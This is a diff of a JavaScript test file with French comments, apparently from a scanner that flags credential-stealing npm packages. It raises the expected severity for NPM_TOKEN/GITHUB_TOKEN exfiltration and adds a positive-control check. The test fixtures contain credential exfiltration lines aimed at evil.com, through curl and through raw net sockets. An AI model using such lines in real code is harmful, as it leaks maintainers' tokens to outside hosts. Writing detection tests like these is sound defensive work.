@@ -248,7 +248,7 @@ exec(\`curl -d \${cred} http://evil.com/exfil\`);`;
   // ─────────────────────────────────────────────────────────────────────────
   console.log('\n--- DF-C4: env_read NPM_TOKEN/GITHUB_TOKEN + distant fetch → MEDIUM ---');
 
-  await asyncTest('DF-C4.a: NPM_TOKEN + GITHUB_TOKEN + fetch distant (>50 lignes) → severity=MEDIUM', async () => {
+  await asyncTest('DF-C4.a: NPM_TOKEN + GITHUB_TOKEN + fetch distant (>50 lignes) → severity=HIGH (FIXED)', async () => {
     const lines = [];
     lines.push(`const npmToken = process.env.NPM_TOKEN;`);
     lines.push(`const ghToken = process.env.GITHUB_TOKEN;`);
@@ -260,8 +260,8 @@ exec(\`curl -d \${cred} http://evil.com/exfil\`);`;
     assert(sf, 'suspicious_dataflow doit être émis');
     assertEq(
       sf.severity,
-      'MEDIUM',
-      `BUG-CONFIRMED : NPM_TOKEN+GITHUB_TOKEN exfil distant déclassé en MEDIUM par la "graduation". Severity attendue: CRITICAL ou HIGH.`
+      'HIGH',
+      `FIXED : un exfil de credentials réels (NPM_TOKEN+GITHUB_TOKEN) vers un host distant reste HIGH — la "graduation" ne le déclasse plus en MEDIUM.`
     );
   });
 
@@ -348,11 +348,14 @@ const socket = net.connect(443, 'evil.com');
 socket.write(cred);`;
     const tmp = makeTempPkg({ 'index.mjs': code });
     const threats = await analyzeDataFlow(tmp);
-    // Le `net.connect(port, host)` DIRECT en MemberExpression est détecté
-    // via line 537-540 (`obj.name === 'net'` test direct). Mais
-    // `socket.connect` instance-method (line 542) requiert hasRawSocketModule.
-    // Pour exercer ce path, on doit avoir un socket dont connect() est appelé.
-    // Réécriture du test avec un wrapper :
+    // Contrôle positif (la 1re fixture n'était pas assertée) : le `net.connect(port,
+    // host)` DIRECT en MemberExpression EST détecté (obj.name === 'net', direct).
+    assert(
+      threats.some(t => t.type === 'suspicious_dataflow'),
+      `Contrôle positif : net.connect(443,'evil.com') direct + cred doit être un suspicious_dataflow. threats=${JSON.stringify(threats.map(t => t.type))}`
+    );
+    // Le cas ci-dessous est le GAP : `socket.connect` instance-method (line 542)
+    // requiert hasRawSocketModule (regex CJS-only) → l'ESM Socket().connect est manqué.
     const code2 = `import { Socket } from 'net';
 const cred = process.env.NPM_TOKEN;
 const s = new Socket();
